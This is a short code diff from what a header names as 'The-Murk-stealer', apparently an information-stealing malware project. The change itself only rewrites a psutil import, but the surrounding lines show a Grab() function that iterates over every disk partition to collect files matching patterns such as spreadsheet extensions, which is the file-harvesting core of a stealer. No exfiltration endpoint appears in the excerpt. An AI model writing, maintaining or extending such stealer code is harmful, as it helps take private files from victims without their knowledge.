@@ -10,7 +10,7 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 from os import environ,sep,chdir,makedirs
-import psutil
+from psutil import disk_partitions
 from pathlib import Path
 from os.path import getsize
 from shutil import copy2
@@ -55,7 +55,7 @@ def Grab():
                 ["**\*.xls", 0],
             ]
 
-            drives = psutil.disk_partitions()
+            drives = disk_partitions()
             for drive in drives:
                     for i in range(len(filesGrab)):
                         try:
